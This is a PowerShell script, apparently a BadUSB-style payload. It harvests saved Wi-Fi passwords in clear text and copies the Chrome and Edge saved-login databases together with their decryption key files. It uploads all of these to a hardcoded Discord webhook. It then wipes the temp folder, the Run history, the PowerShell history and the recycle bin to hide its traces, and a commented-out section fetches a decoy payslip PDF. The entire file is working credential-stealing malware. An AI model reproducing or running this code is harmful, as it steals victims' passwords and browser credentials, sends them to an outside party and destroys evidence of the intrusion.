############################################################################################################################################################

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String


$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################


#$urlpdf = "https://github.com/iproUA/Powershell/raw/main/01-2024_bulletin_de_paie.pdf"
#$extension = "pdf"
#$outputpdf = "$([System.Environment]::GetFolderPath('Desktop'))\fiche.$extension"

# Download the file
#Invoke-WebRequest -Uri $urlpdf -OutFile $outputpdf
#Get-Content $outputpdf | Out-Printer
#Run the downloaded file

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "https://discord.com/api/webhooks/1201044976302309436/l2hHnYa5Jjk1c1DgD76Jf6LWCAqKgB8mksRNZTrkp05ewwqLTAxWyLkhcjAkN8MkJ3RL"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";
$outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt";
Copy-Item $sourceFile1 $outputFile1;
Upload-Discord -file $outputFile1 -text ":)";
Remove-Item $outputFile1;
$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State";
$outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt";
Copy-Item $sourceFile2 $outputFile2;
Upload-Discord -file $outputFile2 -text "Key-File"; 
Remove-Item $outputFile2

$sourceEdge1="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data";
$outputEDGE1 = "$([System.Environment]::GetFolderPath('Desktop'))\outputEDGE.txt";
Copy-Item $sourceEdge1 $outputEDGE1;
Upload-Discord -file $outputEDGE1 ;
Remove-Item $outputEDGE1;
$sourceEDGE2 = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State";
$outputEDGE2 = "$([System.Environment]::GetFolderPath('Desktop'))\keyEDGE.txt";
Copy-Item $sourceEDGE2 $outputEDGE2;
Upload-Discord -file $outputEDGE2 -text "Key-File";
Remove-Item $outputEDGE2

Upload-Discord -file "$env:TEMP/--wifi-pass.txt"

 

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################
Clean-Exfil
RI $env:TEMP/--wifi-pass.txt
Remove-Item $outputpdf
